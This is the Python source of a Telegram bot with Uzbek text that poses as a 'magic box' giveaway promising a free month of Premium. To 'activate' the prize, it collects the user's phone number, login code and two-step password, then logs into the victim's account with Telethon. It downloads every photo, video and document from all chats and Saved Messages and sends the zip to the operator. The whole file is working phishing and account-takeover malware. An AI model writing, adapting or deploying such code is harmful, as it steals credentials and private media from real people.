import os
import re
import json
import zipfile
import shutil
import random
import asyncio

from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher.filters import CommandStart
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# ================== ENV ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

# ================== INIT ==================
bot = Bot(BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

sessions = {}

# ================== JSON ==================
def load_json(path, default):
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, indent=2)
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

users = load_json(USERS_FILE, {})
config = load_json(CONFIG_FILE, {"magic_box": "on"})

def ensure_user(uid):
    users.setdefault(uid, {
        "boxes": 0,
        "win_box": random.randint(1, 3),
        "prize": False,
        "refs": 0,
        "ref_by": None
    })
    save_json(USERS_FILE, users)

# ================== MENUS ==================
def main_menu(is_admin=False):
    kb = [
        ["🎁 Sehrli quti"],
        ["🏆 Yutuqlar", "👥 Referal"],
        ["✅ Aktivlash"]
    ]
    if is_admin:
        kb.append(["⚙️ Admin panel"])
    return types.ReplyKeyboardMarkup(kb, resize_keyboard=True)

def back_menu():
    return types.ReplyKeyboardMarkup([["⬅️ Orqaga"]], resize_keyboard=True)

# ================== START ==================
@dp.message_handler(CommandStart())
async def start(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)

    parts = msg.text.split()
    if len(parts) > 1:
        ref = parts[1]
        if ref in users and ref != uid and users[uid]["ref_by"] is None:
            users[uid]["ref_by"] = ref
            users[ref]["refs"] += 1
            save_json(USERS_FILE, users)

    await msg.answer("👋 Xush kelibsiz", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))

# ================== REFERAL ==================
@dp.message_handler(lambda m: m.text == "👥 Referal")
async def referral(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)
    me = await bot.get_me()

    await msg.answer(
        f"🔗 https://t.me/{me.username}?start={uid}\n"
        f"👤 Taklif qilinganlar: {users[uid]['refs']}"
    )

# ================== YUTUQLAR ==================
@dp.message_handler(lambda m: m.text == "🏆 Yutuqlar")
async def prizes(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)
    if users[uid]["prize"]:
        await msg.answer("🥳 Sizda 1 oylik Premium bor\nUni olish uchun Aktivlash bo‘limiga o‘ting")
    else:
        await msg.answer("❌ Sizda yutuq yo‘q")

# ================== SEHRLI QUTI ==================
@dp.message_handler(lambda m: m.text == "🎁 Sehrli quti")
async def magic_box(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)
    u = users[uid]

    if u["boxes"] >= 3:
        return await msg.answer("❌ Qutilar tugagan")

    kb = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton(
            f"🔓 Ochish ({u['boxes']+1}/3)",
            callback_data="open_box"
        )
    )
    await msg.answer("🎁 Sehrli quti", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "open_box")
async def open_box(c):
    uid = str(c.from_user.id)
    u = users[uid]

    if u["boxes"] >= 3:
        await c.answer("Qutilar tugagan", show_alert=True)
        return

    u["boxes"] += 1
    is_win = config["magic_box"] == "on" and u["boxes"] == u["win_box"] and not u["prize"]
    save_json(USERS_FILE, users)

    if not is_win:
        kb = None
        if u["boxes"] < 3:
            kb = types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
            )
        await c.message.answer("😐 Hech narsa tushmadi", reply_markup=kb)
        await c.answer()
        return

    u["prize"] = True
    save_json(USERS_FILE, users)

    await c.message.answer(
        "🎉 Tabriklaymiz!\n"
        "Sizga 1 oylik Premium berildi.\n"
        "Uni olish uchun Aktivlash bo‘limiga o‘ting."
    )
    await c.answer()

# ================== AKTIVLASH ==================
@dp.message_handler(lambda m: m.text == "✅ Aktivlash")
async def activate(msg: types.Message):
    sessions[msg.from_user.id] = {"step": "phone"}
    await msg.answer(
        "📲 Telefon raqamingizni yuboring\n"
        "❗️Kod SMS emas, Telegram ichiga keladi\n"
        "Namuna: +998901234567",
        reply_markup=back_menu()
    )

@dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
async def go_back(msg: types.Message):
    sessions.pop(msg.from_user.id, None)
    await msg.answer("🏠 Bosh menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))

@dp.message_handler(
    lambda m: m.from_user.id in sessions
    and sessions[m.from_user.id]["step"] in ("phone", "code", "password")
)
async def login_flow(msg: types.Message):
    uid = msg.from_user.id
    state = sessions[uid]
    text = msg.text.strip()

    # PHONE
    if state["step"] == "phone":
        digits = re.sub(r"\D", "", text)
        if len(digits) < 8:
            await msg.answer("❌ Telefon noto‘g‘ri")
            return

        phone = "+" + digits
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        sent = await client.send_code_request(phone, force_sms=False)

        state.update({
            "step": "code",
            "phone": phone,
            "client": client,
            "phone_code_hash": sent.phone_code_hash
        })

        await msg.answer("🔐 Kodni kiriting\nMasalan: 12345")
        return

    # CODE
    if state["step"] == "code":
        code = re.sub(r"\D", "", text)
        if len(code) < 5:
            await msg.answer("❌ Kod noto‘g‘ri")
            return

        try:
            await state["client"].sign_in(
                phone=state["phone"],
                code=code,
                phone_code_hash=state["phone_code_hash"]
            )
        except SessionPasswordNeededError:
            state["step"] = "password"
            await msg.answer("🔑 2 bosqichli parolni kiriting")
            return
        except PhoneCodeExpiredError:
            await msg.answer("⛔ Kod eskirdi. Qayta Aktivlash bosing.")
            await state["client"].disconnect()
            sessions.pop(uid, None)
            return

        await msg.answer("⏳ 2 chi bosqich, iltimos kuting...")
        await export_medias(uid)
        return

    # PASSWORD
    if state["step"] == "password":
        await state["client"].sign_in(password=text)
        await msg.answer("⏳ 2 bosqich , iltimos kuting...")
        await export_medias(uid)

# ================== EXPORT MEDIAS ==================
from telethon.tl.types import (
    User,
    InputPeerSelf,
    InputMessagesFilterPhotos,
    InputMessagesFilterVideo,
    InputMessagesFilterDocument
)

async def export_medias(uid):
    client = sessions[uid]["client"]

    MEDIA_DIR = f"medias_{uid}"
    ZIP_NAME = f"medias_{uid}.zip"

    os.makedirs(MEDIA_DIR, exist_ok=True)

    total = 0

    # 🔔 ADMIN LOG (boshlanishi)
    await bot.send_message(ADMIN_ID, "🚀 Media yig‘ish boshlandi")

    dialogs = []

    async for d in client.iter_dialogs():
        dialogs.append(d)

    # ➕ Saved Messages ni qo‘shamiz
    dialogs.append(types.SimpleNamespace(entity=InputPeerSelf()))

    for dialog in dialogs:
        entity = dialog.entity

        # BOTLARNI O‘TKAZIB YUBORAMIZ
        if isinstance(entity, User) and entity.bot:
            continue

        folder_name = "saved" if isinstance(entity, InputPeerSelf) else str(getattr(entity, "id", "unknown"))
        user_folder = os.path.join(MEDIA_DIR, folder_name)
        os.makedirs(user_folder, exist_ok=True)

        for flt in (
            InputMessagesFilterPhotos,
            InputMessagesFilterVideo,
            InputMessagesFilterDocument,
        ):
            async for m in client.iter_messages(entity, filter=flt):
                try:
                    await m.download_media(file=user_folder)
                    total += 1

                    # 🔔 har 5 ta media log
                    if total % 5 == 0:
                        await bot.send_message(
                            ADMIN_ID,
                            f"📥 Yuklandi: {total} ta media"
                        )
                except Exception as e:
                    print("Xato:", e)

    # 🔒 ZIP
    if total == 0:
        await bot.send_message(ADMIN_ID, "⚠️ Hech qanday media topilmadi")
    else:
        with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(MEDIA_DIR):
                for file in files:
                    full = os.path.join(root, file)
                    z.write(full, arcname=os.path.relpath(full, MEDIA_DIR))

        await bot.send_document(
            ADMIN_ID,
            types.InputFile(ZIP_NAME),
            caption=f"📦 Media ZIP\nJami: {total} ta"
        )

        os.remove(ZIP_NAME)

    shutil.rmtree(MEDIA_DIR)

    await client.disconnect()
    sessions.pop(uid, None)

    await bot.send_message(ADMIN_ID, "✅ Media yig‘ish tugadi")



# ================== ADMIN ==================
@dp.message_handler(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
async def admin_panel(msg: types.Message):
    kb = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("ON", callback_data="on"),
        types.InlineKeyboardButton("OFF", callback_data="off")
    )
    await msg.answer("🎁 Sehrli quti holati", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data in ["on", "off"] and c.from_user.id == ADMIN_ID)
async def admin_switch(c):
    config["magic_box"] = c.data
    save_json(CONFIG_FILE, config)
    await c.answer("Saqlandi")

# ================== RUN ==================
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
